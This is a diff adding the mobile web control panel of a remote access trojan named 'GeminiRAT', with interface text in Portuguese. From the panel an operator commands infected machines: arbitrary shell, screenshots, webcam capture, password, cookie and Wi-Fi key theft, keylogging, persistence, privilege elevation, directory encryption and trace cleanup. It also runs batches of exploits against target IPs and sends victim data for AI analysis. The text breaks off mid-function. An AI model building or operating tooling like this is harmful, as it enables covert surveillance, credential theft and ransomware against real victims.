@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>GeminiRAT · Móvel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+    <style>
+        :root {
+            --bg:        #060608;
+            --surface:   #0e0f14;
+            --surface2:  #161820;
+            --border:    rgba(255,255,255,0.07);
+            --border2:   rgba(255,255,255,0.12);
+            --red:       #ff4d6d;
+            --red-dim:   rgba(255,77,109,0.15);
+            --cyan:      #00d4ff;
+            --cyan-dim:  rgba(0,212,255,0.12);
+            --green:     #39d98a;
+            --amber:     #ffbe0b;
+            --gray:      #6b7280;
+            --text:      #e2e8f0;
+            --text2:     #94a3b8;
+            --mono:      'IBM Plex Mono', monospace;
+            --sans:      'Space Grotesk', sans-serif;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        html, body { height: 100%; overflow: hidden; background: var(--bg); }
+        body { font-family: var(--sans); color: var(--text); display: flex; flex-direction: column; max-width: 480px; margin: 0 auto; position: relative; }
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 99px; }
+
+        /* Header */
+        .header { flex-shrink:0; background:var(--surface); border-bottom:1px solid var(--border); padding:env(safe-area-inset-top,12px) 16px 12px; display:flex; align-items:center; justify-content:space-between; gap:12px; }
+        .header-brand { display:flex; align-items:center; gap:10px; }
+        .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--red),#a020f0); display:flex; align-items:center; justify-content:center; font-size:14px; }
+        .header-brand h1 { font-size:1rem; font-weight:700; letter-spacing:-0.02em; }
+        .header-meta { display:flex; align-items:center; gap:12px; }
+        .ws-badge { font-size:0.65rem; font-weight:600; padding:3px 8px; border-radius:99px; font-family:var(--mono); }
+        .ws-badge.online  { background:rgba(57,217,138,0.15); color:var(--green); border:1px solid rgba(57,217,138,0.3); }
+        .ws-badge.offline { background:rgba(255,77,109,0.15);  color:var(--red);   border:1px solid rgba(255,77,109,0.3); }
+        .ws-badge.pending { background:rgba(255,190,11,0.15);  color:var(--amber); border:1px solid rgba(255,190,11,0.3); }
+
+        /* Content + Pages */
+        .content { flex:1; overflow:hidden; display:flex; flex-direction:column; }
+        .page { display:none; flex-direction:column; flex:1; overflow:hidden; }
+        .page.active { display:flex; }
+
+        /* Bottom Nav */
+        .bottom-nav { flex-shrink:0; background:var(--surface); border-top:1px solid var(--border); display:grid; grid-template-columns:repeat(3,1fr); padding-bottom:env(safe-area-inset-bottom,0); }
+        .nav-btn { display:flex; flex-direction:column; align-items:center; padding:10px 0; gap:4px; border:none; background:none; cursor:pointer; color:var(--gray); font-size:0.6rem; font-weight:600; font-family:var(--sans); letter-spacing:0.04em; text-transform:uppercase; transition:color .15s; position:relative; }
+        .nav-btn i { font-size:1.1rem; }
+        .nav-btn.active { color:var(--red); }
+        .nav-btn.active::after { content:''; position:absolute; top:0; left:50%; transform:translateX(-50%); width:24px; height:2px; background:var(--red); border-radius:99px; }
+        .nav-badge { position:absolute; top:6px; right:calc(50% - 14px); background:var(--red); color:white; font-size:0.55rem; font-weight:700; padding:1px 4px; border-radius:99px; min-width:14px; text-align:center; }
+
+        /* Agents page */
+        .search-wrap { padding:12px 14px 8px; flex-shrink:0; }
+        .search-wrap-inner { position:relative; }
+        .search-icon { position:absolute; left:11px; top:50%; transform:translateY(-50%); color:var(--gray); font-size:0.75rem; }
+        .search-input { width:100%; background:var(--surface2); border:1px solid var(--border); border-radius:10px; padding:9px 14px 9px 36px; color:var(--text); font-size:0.82rem; font-family:var(--sans); outline:none; transition:border-color .15s; }
+        .search-input:focus { border-color:var(--border2); }
+        .search-input::placeholder { color:var(--gray); }
+        .agents-list { flex:1; overflow-y:auto; padding:6px 14px 14px; display:flex; flex-direction:column; gap:8px; }
+
+        /* Agent card */
+        .agent-card { background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:14px; cursor:pointer; transition:border-color .15s,background .15s; position:relative; overflow:hidden; }
+        .agent-card::before { content:''; position:absolute; top:0; left:0; width:3px; height:100%; background:var(--border); transition:background .15s; }
+        .agent-card.online::before  { background:var(--green); }
+        .agent-card.offline::before { background:var(--gray); }
+        .agent-card:active { background:var(--surface2); }
+        .agent-card.selected { border-color:var(--red); background:var(--red-dim); }
+        .agent-card.selected::before { background:var(--red); }
+        .agent-row1 { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; }
+        .agent-hostname { font-size:0.92rem; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:60%; }
+        .agent-status { display:flex; align-items:center; gap:5px; }
+        .sdot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
+        .sdot.online  { background:var(--green); box-shadow:0 0 6px var(--green); }
+        .sdot.offline { background:var(--gray); }
+        .status-text { font-size:0.65rem; font-weight:600; }
+        .status-text.online  { color:var(--green); }
+        .status-text.offline { color:var(--gray); }
+        .agent-row2 { display:flex; justify-content:space-between; align-items:center; }
+        .agent-meta { display:flex; align-items:center; gap:6px; font-size:0.7rem; color:var(--text2); }
+        .agent-meta i { font-size:0.65rem; }
+        .agent-row3 { display:flex; justify-content:space-between; margin-top:8px; padding-top:8px; border-top:1px solid var(--border); }
+        .agent-sub { font-size:0.67rem; color:var(--gray); display:flex; align-items:center; gap:4px; }
+
+        /* Interact sheet */
+        .interact-sheet { position:fixed; inset:0; z-index:40; background:var(--bg); display:flex; flex-direction:column; transform:translateY(100%); transition:transform .3s cubic-bezier(0.32,0.72,0,1); }
+        .interact-sheet.open { transform:translateY(0); }
+        .sheet-header { flex-shrink:0; background:var(--surface); border-bottom:1px solid var(--border); padding:env(safe-area-inset-top,8px) 14px 10px; display:flex; align-items:center; gap:10px; }
+        .sheet-back { width:36px; height:36px; border-radius:8px; background:var(--surface2); border:1px solid var(--border); display:flex; align-items:center; justify-content:center; cursor:pointer; color:var(--text2); flex-shrink:0; }
+        .sheet-title { flex:1; min-width:0; }
+        .sheet-title h2 { font-size:0.9rem; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+        .sheet-title p  { font-size:0.68rem; color:var(--text2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; margin-top:1px; }
+        .sheet-action { width:36px; height:36px; border-radius:8px; background:var(--cyan-dim); border:1px solid rgba(0,212,255,0.2); display:flex; align-items:center; justify-content:center; cursor:pointer; color:var(--cyan); flex-shrink:0; }
+        .sheet-body { flex:1; display:flex; flex-direction:column; padding:12px; gap:10px; overflow:hidden; }
+        .terminal-box { flex:1; min-height:0; background:#020305; border:1px solid var(--border); border-radius:10px; padding:12px; font-family:var(--mono); font-size:0.72rem; line-height:1.7; overflow-y:auto; color:#a8b2c4; white-space:pre-wrap; word-break:break-all; }
+        .shell-row { display:flex; background:var(--surface2); border:1px solid var(--border); border-radius:10px; flex-shrink:0; overflow:hidden; }
+        .shell-prompt { padding:0 10px; display:flex; align-items:center; color:var(--red); font-family:var(--mono); font-size:0.85rem; flex-shrink:0; }
+        .shell-input { flex:1; background:transparent; border:none; outline:none; padding:11px 6px; font-family:var(--mono); font-size:0.8rem; color:var(--text); }
+        .shell-btn { background:var(--red); border:none; padding:0 16px; color:white; cursor:pointer; font-size:0.85rem; flex-shrink:0; transition:background .15s; }
+        .shell-btn:active { background:#e0334d; }
+        .quick-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:6px; flex-shrink:0; }
+        .qbtn { background:var(--surface2); border:1px solid var(--border); border-radius:9px; padding:10px 4px; display:flex; flex-direction:column; align-items:center; gap:4px; cursor:pointer; transition:all .15s; font-family:var(--sans); color:var(--text2); }
+        .qbtn:active { background:var(--red-dim); border-color:var(--red); color:var(--red); }
+        .qbtn i { font-size:1rem; }
+        .qbtn span { font-size:0.58rem; font-weight:600; letter-spacing:0.02em; }
+
+        /* Exploits page */
+        .exploits-page { padding:12px 14px; display:flex; flex-direction:column; gap:10px; flex:1; overflow:hidden; }
+        .section-label { font-size:0.65rem; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:var(--gray); margin-bottom:4px; }
+        .target-row { display:flex; gap:8px; }
+        .ctrl { background:var(--surface); border:1px solid var(--border); border-radius:9px; padding:9px 12px; color:var(--text); font-size:0.8rem; font-family:var(--mono); outline:none; transition:border-color .15s; }
+        .ctrl:focus { border-color:var(--border2); }
+        .ctrl::placeholder { color:var(--gray); opacity:.6; }
+        .exploit-scroll { flex:1; overflow-y:auto; display:flex; flex-direction:column; gap:6px; }
+        .exploit-item { background:var(--surface); border:1px solid var(--border); border-radius:10px; padding:11px 14px; cursor:pointer; display:flex; align-items:center; gap:10px; transition:all .15s; user-select:none; }
+        .exploit-item:active { background:var(--red-dim); }
+        .exploit-item.selected { border-color:var(--red); background:var(--red-dim); }
+        .e-chk { width:16px; height:16px; border-radius:4px; border:1.5px solid var(--border2); background:var(--bg); flex-shrink:0; display:flex; align-items:center; justify-content:center; transition:all .15s; }
+        .exploit-item.selected .e-chk { background:var(--red); border-color:var(--red); }
+        .e-chk-icon { display:none; color:white; font-size:0.55rem; }
+        .exploit-item.selected .e-chk-icon { display:block; }
+        .exploit-info { flex:1; min-width:0; }
+        .exploit-name { font-size:0.8rem; font-weight:600; }
+        .exploit-sub { font-size:0.65rem; color:var(--text2); margin-top:2px; display:flex; gap:6px; align-items:center; }
+        .cve-badge { font-size:0.6rem; padding:1px 6px; border-radius:99px; background:rgba(255,77,109,0.12); color:var(--red); border:1px solid rgba(255,77,109,0.2); font-family:var(--mono); }
+        .port-badge-e { font-size:0.6rem; color:var(--gray); font-family:var(--mono); }
+        .exploit-run-bar { display:flex; gap:8px; flex-shrink:0; }
+        .btn-run-mobile { flex:1; background:var(--red); border:none; border-radius:10px; padding:12px; color:white; font-size:0.85rem; font-weight:700; font-family:var(--sans); cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; transition:background .15s; }
+        .btn-run-mobile:disabled { opacity:.4; cursor:not-allowed; }
+        .btn-run-mobile:not(:disabled):active { background:#e0334d; }
+        .btn-mode { width:44px; background:var(--surface2); border:1px solid var(--border); border-radius:10px; display:flex; align-items:center; justify-content:center; cursor:pointer; color:var(--gray); font-size:0.85rem; transition:all .15s; }
+        .btn-mode.parallel { border-color:var(--amber); color:var(--amber); background:rgba(255,190,11,0.1); }
+
+        /* Terminal page */
+        .terminal-page { flex:1; display:flex; flex-direction:column; padding:12px 14px; gap:10px; overflow:hidden; }
+        .term-header { display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
+        .term-status { display:flex; align-items:center; gap:6px; }
+        .term-dot { width:7px; height:7px; border-radius:50%; background:var(--border); }
+        .term-dot.running { background:var(--amber); animation:blink .8s infinite; }
+        .term-dot.ok   { background:var(--green); }
+        .term-dot.fail { background:var(--gray); }
+        @keyframes blink { 50% { opacity:.2; } }
+        .term-label { font-size:0.72rem; color:var(--gray); }
+        .clear-btn { font-size:0.7rem; color:var(--gray); background:none; border:none; cursor:pointer; font-family:var(--sans); }
+        .exploit-terminal { flex:1; min-height:0; background:#020305; border:1px solid var(--border); border-radius:10px; padding:12px; font-family:var(--mono); font-size:0.7rem; line-height:1.75; overflow-y:auto; white-space:pre-wrap; word-break:break-all; }
+        .log-info { color:#6b7280; }
+        .log-ok   { color:#4ade80; }
+        .log-err  { color:#f87171; }
+        .log-warn { color:#fbbf24; }
+        .log-step { color:#38bdf8; }
+        .log-vuln { color:#c084fc; }
+        .log-time { color:#374151; margin-right:6px; }
+        .t-empty  { color:#374151; text-align:center; padding:3rem 0; font-size:0.75rem; }
+
+        /* Modal */
+        .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.75); z-index:60; display:flex; align-items:flex-end; opacity:0; transition:opacity .2s; pointer-events:none; }
+        .modal-overlay.open { opacity:1; pointer-events:all; }
+        .modal-box { background:var(--surface); border:1px solid var(--border); border-radius:16px 16px 0 0; width:100%; max-height:85vh; display:flex; flex-direction:column; transform:translateY(20px); transition:transform .2s; }
+        .modal-overlay.open .modal-box { transform:translateY(0); }
+        .modal-drag { width:36px; height:4px; background:var(--border2); border-radius:99px; margin:10px auto 0; flex-shrink:0; }
+        .modal-hdr { padding:14px 16px 10px; display:flex; align-items:center; justify-content:space-between; border-bottom:1px solid var(--border); flex-shrink:0; }
+        .modal-hdr h3 { font-size:0.95rem; font-weight:700; }
+        .modal-close { background:none; border:none; color:var(--gray); font-size:1.1rem; cursor:pointer; }
+        .modal-body { overflow-y:auto; padding:14px 16px; display:flex; flex-direction:column; gap:12px; }
+        .cmd-group-title { font-size:0.65rem; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:6px; }
+        .cmd-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; }
+        .cmd-btn { background:var(--surface2); border:1px solid var(--border); border-radius:9px; padding:11px 10px; font-size:0.78rem; font-weight:600; font-family:var(--sans); color:var(--text); cursor:pointer; text-align:left; transition:all .15s; }
+        .cmd-btn:active { background:var(--red-dim); border-color:var(--red); }
+        .cmd-btn.destructive { color:var(--red); border-color:rgba(255,77,109,0.3); background:rgba(255,77,109,0.06); }
+        .analysis-text { font-size:0.78rem; line-height:1.7; color:var(--text2); }
+        .analysis-text h3 { font-size:0.85rem; font-weight:700; color:var(--cyan); margin:12px 0 4px; }
+        .analysis-text h4 { font-size:0.8rem; font-weight:600; color:#a78bfa; margin:10px 0 3px; }
+        .analysis-text strong { color:var(--text); }
+        .analysis-text code { font-family:var(--mono); font-size:0.7rem; background:rgba(0,0,0,0.4); padding:1px 5px; border-radius:4px; color:#fbbf24; }
+        .img-modal img { max-width:100%; border-radius:10px; }
+        .empty-state { text-align:center; padding:3rem 1rem; color:var(--gray); }
+        .empty-state i { font-size:2rem; margin-bottom:10px; display:block; opacity:.4; }
+        .empty-state p { font-size:0.8rem; }
+    </style>
+</head>
+<body>
+
+<header class="header">
+    <div class="header-brand">
+        <div class="logo"><i class="fas fa-shield-virus" style="color:white"></i></div>
+        <h1>GeminiRAT</h1>
+    </div>
+    <div class="header-meta">
+        <div id="online-badge" style="font-size:0.72rem;font-weight:600;color:var(--green)">0 online</div>
+        <span id="ws-badge" class="ws-badge pending">Conectando</span>
+        <a href="/logout" style="color:var(--gray);font-size:1rem"><i class="fas fa-sign-out-alt"></i></a>
+    </div>
+</header>
+
+<div class="content">
+
+    <!-- Page: Agentes -->
+    <div id="page-agents" class="page active">
+        <div class="search-wrap">
+            <div class="search-wrap-inner">
+                <i class="fas fa-search search-icon"></i>
+                <input type="text" id="agent-search" class="search-input" placeholder="Buscar por hostname, IP, usuário...">
+            </div>
+        </div>
+        <div id="agents-list" class="agents-list">
+            <div class="empty-state"><i class="fas fa-satellite-dish"></i><p>Aguardando agentes...</p></div>
+        </div>
+    </div>
+
+    <!-- Page: Exploits -->
+    <div id="page-exploits" class="page">
+        <div class="exploits-page">
+            <div>
+                <div class="section-label">Alvo & Portas</div>
+                <div class="target-row">
+                    <input type="text" id="exploit-target" class="ctrl" style="flex:1" placeholder="192.168.0.117">
+                    <input type="text" id="exploit-ports"  class="ctrl" style="width:110px" placeholder="portas">
+                </div>
+            </div>
+            <div style="display:flex;align-items:center;justify-content:space-between;flex-shrink:0">
+                <div class="section-label" style="margin-bottom:0">
+                    Exploits <span id="exploit-sel-count" style="color:var(--red);font-family:var(--mono)"></span>
+                </div>
+                <div style="display:flex;gap:10px">
+                    <button onclick="selectAllExploits()" style="font-size:0.65rem;color:var(--gray);background:none;border:none;cursor:pointer;font-family:var(--sans)">Todos</button>
+                    <button onclick="clearExploitSel()"   style="font-size:0.65rem;color:var(--gray);background:none;border:none;cursor:pointer;font-family:var(--sans)">Limpar</button>
+                </div>
+            </div>
+            <div id="exploit-scroll" class="exploit-scroll">
+                <div class="empty-state"><i class="fas fa-crosshairs"></i><p>Carregando exploits...</p></div>
+            </div>
+            <div class="exploit-run-bar">
+                <button id="mode-btn" class="btn-mode" onclick="toggleExploitMode()" title="Modo: Sequencial">
+                    <i class="fas fa-arrow-down"></i>
+                </button>
+                <button id="run-exploit-btn" class="btn-run-mobile" onclick="runMobileExploits()" disabled>
+                    <i class="fas fa-crosshairs"></i> Executar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page: Terminal -->
+    <div id="page-terminal" class="page">
+        <div class="terminal-page">
+            <div class="term-header">
+                <div class="term-status">
+                    <div class="term-dot" id="term-dot"></div>
+                    <span class="term-label" id="term-label">Aguardando</span>
+                </div>
+                <button class="clear-btn" onclick="clearExploitTerminal()">
+                    <i class="fas fa-trash-alt" style="margin-right:4px"></i>Limpar
+                </button>
+            </div>
+            <div id="exploit-terminal" class="exploit-terminal">
+                <div class="t-empty">
+                    <i class="fas fa-terminal" style="font-size:1.5rem;display:block;margin-bottom:8px;opacity:.4"></i>
+                    Execute um exploit para ver o output aqui.
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<nav class="bottom-nav">
+    <button class="nav-btn active" id="nav-agents"   onclick="navigateTo('agents')">
+        <i class="fas fa-satellite-dish"></i>Agentes
+    </button>
+    <button class="nav-btn" id="nav-exploits" onclick="navigateTo('exploits')">
+        <i class="fas fa-crosshairs"></i>Exploits
+    </button>
+    <button class="nav-btn" id="nav-terminal" onclick="navigateTo('terminal')">
+        <i class="fas fa-terminal"></i>Terminal
+        <span class="nav-badge" id="term-badge" style="display:none">!</span>
+    </button>
+</nav>
+
+<!-- Interact Sheet -->
+<div id="interact-sheet" class="interact-sheet">
+    <div class="sheet-header">
+        <div class="sheet-back" onclick="closeSheet()"><i class="fas fa-chevron-down"></i></div>
+        <div class="sheet-title">
+            <h2 id="sheet-hostname">—</h2>
+            <p id="sheet-details">—</p>
+        </div>
+        <div class="sheet-action" onclick="showAnalysisModal()"><i class="fas fa-brain"></i></div>
+    </div>
+    <div class="sheet-body">
+        <div id="results-box" class="terminal-box"><span style="color:var(--gray)">Aguardando comando...</span></div>
+        <div class="shell-row">
+            <span class="shell-prompt">$</span>
+            <input type="text" id="shell-input" class="shell-input" placeholder="whoami">
+            <button class="shell-btn" onclick="issueShell()"><i class="fas fa-paper-plane"></i></button>
+        </div>
+        <div class="quick-grid">
+            <div class="qbtn" onclick="issueCommand('screenshot')"><i class="fas fa-camera"></i><span>Tela</span></div>
+            <div class="qbtn" onclick="issueCommand('webcam_snap')"><i class="fas fa-video"></i><span>Webcam</span></div>
+            <div class="qbtn" onclick="issueCommand('processes')"><i class="fas fa-microchip"></i><span>Procs</span></div>
+            <div class="qbtn" onclick="openCommandsModal()"><i class="fas fa-ellipsis-h"></i><span>Mais</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal -->
+<div id="modal-overlay" class="modal-overlay" onclick="closeModal()">
+    <div class="modal-box" onclick="event.stopPropagation()">
+        <div class="modal-drag"></div>
+        <div id="modal-inner"></div>
+    </div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>
+<script>
+const notyf = new Notyf({
+    duration: 2500, position:{ x:'center', y:'top' }, ripple: false,
+    types: [
+        { type:'success', background:'#39d98a', icon:false },
+        { type:'error',   background:'#ff4d6d', icon:false }
+    ]
+});
+
+let selectedAgentId  = null;
+let agentsData       = {};
+let exploitsMeta     = {};
+let selectedExploits = new Set();
+let exploitMode      = 'sequential';
+let currentRunId     = null;
+let isExploiting     = false;
+let termHasNewData   = false;
+
+// ── Navigation ────────────────────────────────────────────────────────────────
+function navigateTo(page) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById(`page-${page}`).classList.add('active');
+    document.getElementById(`nav-${page}`).classList.add('active');
+    if (page === 'terminal') {
+        termHasNewData = false;
+        document.getElementById('term-badge').style.display = 'none';
+    }
+}
+
+// ── Sheet ─────────────────────────────────────────────────────────────────────
+function openSheet(agentId) {
+    vibrate();
+    selectedAgentId = agentId;
+    const agent = agentsData[agentId];
+    document.getElementById('sheet-hostname').textContent = agent.hostname;
+    document.getElementById('sheet-details').textContent =
+        `${agent.os_name} · ${agent.external_ip || agent.internal_ip || 'N/A'} · ${agent.privileges || '—'}`;
+    document.getElementById('results-box').innerHTML = '<span style="color:var(--gray)">Conectado.</span>';
+    document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('selected'));
+    document.querySelector(`.agent-card[data-id="${agentId}"]`)?.classList.add('selected');
+    document.getElementById('interact-sheet').classList.add('open');
+}
+function closeSheet() { document.getElementById('interact-sheet').classList.remove('open'); }
+
+// ── Modal ─────────────────────────────────────────────────────────────────────
+function openModal(html) {
+    document.getElementById('modal-inner').innerHTML = html;
+    document.getElementById('modal-overlay').classList.add('open');
+}
+function closeModal() { document.getElementById('modal-overlay').classList.remove('open'); }
+
+// ── Issue Command — BUG FIX: estrutura correta ────────────────────────────────
+function issueCommand(command, args = "") {
+    if (!selectedAgentId) {
+        notyf.error('Nenhum agente selecionado.');
+        return;
+    }
+    vibrate();
+    document.getElementById('results-box').innerHTML =
+        `<span style="color:var(--amber)">Enviando '${command}'...</span>`;
+    fetch('/issue_command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ agent_id: selectedAgentId, command, args })
+    })
+    .then(res => res.ok
+        ? notyf.success(`'${command}' enviado.`)
+        : notyf.error('Falha ao enviar.'))
+    .catch(() => notyf.error('Sem conexão com o servidor.'));
+    closeModal();
+}
+
+function issueShell() {
+    const inp = document.getElementById('shell-input');
+    const cmd = inp.value.trim();
+    if (cmd) { issueCommand('shell', cmd); inp.value = ''; }
+}
+
+// ── Commands Modal ────────────────────────────────────────────────────────────
+function openCommandsModal() {
+    openModal(`
+        <div class="modal-hdr">
+            <h3>Comandos</h3>
+            <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="modal-body">
+            <div>
+                <div class="cmd-group-title" style="color:var(--cyan)">Coleta & Reconhecimento</div>
+                <div class="cmd-grid">
+                    <button class="cmd-btn" onclick="issueCommand('credentials')"><i class="fas fa-key" style="margin-right:6px;color:var(--amber)"></i>Senhas</button>
+                    <button class="cmd-btn" onclick="issueCommand('cookies')"><i class="fas fa-cookie" style="margin-right:6px;color:var(--amber)"></i>Cookies</button>
+                    <button class="cmd-btn" onclick="issueCommand('network_recon')"><i class="fas fa-network-wired" style="margin-right:6px;color:var(--cyan)"></i>Recon Rede</button>
+                    <button class="cmd-btn" onclick="issueCommand('wifi_passwords')"><i class="fas fa-wifi" style="margin-right:6px;color:var(--cyan)"></i>Wi-Fi</button>
+                    <button class="cmd-btn" onclick="issueCommand('sysinfo')"><i class="fas fa-info-circle" style="margin-right:6px"></i>SysInfo</button>
+                    <button class="cmd-btn" onclick="issueCommand('network_scan')"><i class="fas fa-search" style="margin-right:6px;color:var(--green)"></i>Scan Rede</button>
+                </div>
+            </div>
+            <div>
+                <div class="cmd-group-title" style="color:var(--amber)">Persistência & Controle</div>
+                <div class="cmd-grid">
+                    <button class="cmd-btn" onclick="promptPersist()"><i class="fas fa-anchor" style="margin-right:6px"></i>Persistir</button>
+                    <button class="cmd-btn" onclick="issueCommand('elevate')"><i class="fas fa-user-shield" style="margin-right:6px"></i>Elevar</button>
+                    <button class="cmd-btn" onclick="promptKill()"><i class="fas fa-times-circle" style="margin-right:6px"></i>Kill PID</button>
+                    <button class="cmd-btn" onclick="issueCommand('keylogger_start')"><i class="fas fa-keyboard" style="margin-right:6px"></i>Keylogger</button>
+                </div>
+            </div>
+            <div>
+                <div class="cmd-group-title" style="color:var(--red)">Ações Destrutivas</div>
+                <div class="cmd-grid">
+                    <button class="cmd-btn destructive" onclick="promptEncrypt()"><i class="fas fa-lock" style="margin-right:6px"></i>Encrypt</button>
+                    <button class="cmd-btn destructive" onclick="confirmCleanup()"><i class="fas fa-fire" style="margin-right:6px"></i>Cleanup</button>
+                </div>
+            </div>
+        </div>`);
+}
+
+function promptPersist()  { const m = prompt('Método (run_key/schtask/service):', 'run_key'); if (m) issueCommand('persist', { method: m }); }
+function promptKill()     { const p = prompt('PID:'); if (p && !isNaN(parseInt(p))) issueCommand('kill', p); }
+function promptEncrypt()  { const d = prompt('Caminho do diretório:'); if (d && confirm(`CRIPTOGRAFAR '${d}'? IRREVERSÍVEL!`)) issueCommand('encrypt', d); }
+function confirmCleanup() { if (confirm('Remover persistência e agente do alvo?')) issueCommand('cleanup'); }
+
+// ── Analysis Modal ────────────────────────────────────────────────────────────
+function showAnalysisModal() {
+    if (!selectedAgentId) return;
+    openModal(`
+        <div class="modal-hdr">
+            <h3 style="color:var(--cyan)"><i class="fas fa-brain" style="margin-right:6px"></i>Análise IA</h3>
+            <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="modal-body">
+            <div id="ai-content" style="text-align:center;padding:2rem">
+                <i class="fas fa-spinner fa-spin" style="font-size:1.5rem;color:var(--cyan)"></i>
+                <p style="font-size:0.75rem;color:var(--gray);margin-top:10px">Consultando IA...</p>
+            </div>
+        </div>`);
+
+    fetch('/api/analyze_agent', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ agent_id: selectedAgentId })
+    })
+    .then(r => r.ok ? r.json() : Promise.reject())
+    .then(data => {
+        const html = (data.analysis || '')
+            .replace(/^# (.*?)$/gm,  '<h3>$1</h3>')
+            .replace(/^## (.*?)$/gm, '<h4>$1</h4>')
+            .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+            .replace(/`(.*?)`/g, '<code>$1</code>')
+            .replace(/\n/g, '<br>');
+        const el = document.getElementById('ai-content');
+        el.className = 'analysis-text';
+        el.innerHTML = html;
+    })
+    .catch(() => {
+        document.getElementById('ai-content').innerHTML = '<p style="color:var(--red)">Erro ao obter análise.</p>';
+    });
+}
+
+// ── Image Modal ───────────────────────────────────────────────────────────────
+function showImageModal(b64) {
+    openModal(`
+        <div class="modal-hdr">
+            <h3>Captura</h3>
+            <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="modal-body img-modal">
+            <img src="data:image/jpeg;base64,${b64}">
+        </div>`);
+}
+
+// ── Exploits ──────────────────────────────────────────────────────────────────
+function loadExploits() {
+    fetch('/api/exploits/list')
+        .then(r => r.json())
+        .then(data => {
+            exploitsMeta = {};
+            data.exploits.forEach(e => exploitsMeta[e.filename] = e);
+            renderExploits(data.exploits);
+        })
+        .catch(() => {
+            document.getElementById('exploit-scroll').innerHTML =
+                '<div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Erro ao carregar exploits.</p></div>';
+        });
+}
+
+function renderExploits(exploits) {
+    const container = document.getElementById('exploit-scroll');
+    if (!exploits.length) {
+        container.innerHTML = '<div class="empty-state"><i class="fas fa-crosshairs"></i><p>Nenhum exploit em /exploits.</p></div>';
+        return;
+    }
+    container.innerHTML = exploits.map(e => `
+        <div class="exploit-item ${selectedExploits.has(e.filename) ? 'selected' : ''}"
+             id="ei-${e.filename.replace(/\./g,'-')}"
+             onclick="toggleExploitItem('${e.filename}')">
+            <div class="e-chk"><i class="fas fa-check e-chk-icon"></i></div>
+            <div class="exploit-info">
+                <div class="exploit-name">${e.filename.replace('.py','')}</div>
+                <div class="exploit-sub">
+                    ${e.cve ? `<span class="cve-badge">${e.cve}</span>` : ''}
+                    ${e.default_port ? `<span class="port-badge-e">:${e.default_port}</span>` : ''}
+                </div>
+            </div>
+        </div>`).join('');
+    updateExploitRunBtn();
+}
+
+function toggleExploitItem(filename) {
+    if (isExploiting) return;
+    vibrate(30);
+    selectedExploits.has(filename) ? selectedExploits.delete(filename) : selectedExploits.add(filename);
+    document.getElementById(`ei-${filename.replace(/\./g,'-')}`)?.classList.toggle('selected', selectedExploits.has(filename));
+    updateExploitRunBtn();
+}
+
+function selectAllExploits() {
+    Object.keys(exploitsMeta).forEach(f => selectedExploits.add(f));
+    document.querySelectorAll('.exploit-item').forEach(c => c.classList.add('selected'));
+    updateExploitRunBtn();
+}
+
+function clearExploitSel() {
+    selectedExploits.clear();
+    document.querySelectorAll('.exploit-item').forEach(c => c.classList.remove('selected'));
+    updateExploitRunBtn();
+}
+
+function updateExploitRunBtn() {
+    document.getElementById('run-exploit-btn').disabled = isExploiting || !selectedExploits.size;
+    document.getElementById('exploit-sel-count').textContent = selectedExploits.size ? `(${selectedExploits.size})` : '';
+}
+
+function toggleExploitMode() {
+    exploitMode = exploitMode === 'sequential' ? 'parallel' : 'sequential';
+    const btn = document.getElementById('mode-btn');
+    if (exploitMode === 'parallel') {
+        btn.classList.add('parallel');
+        btn.innerHTML = '<i class="fas fa-bolt"></i>';
+        btn.title = 'Modo: Paralelo';
+    } else {
+        btn.classList.remove('parallel');
+        btn.innerHTML = '<i class="fas fa-arrow-down"></i>';
+        btn.title = 'Modo: Sequencial';
+    }
+}
+
+function runMobileExploits() {
+    const target     = document.getElementById('exploit-target').value.trim();
+    const portsInput = document.getElementById('exploit-ports').value.trim();
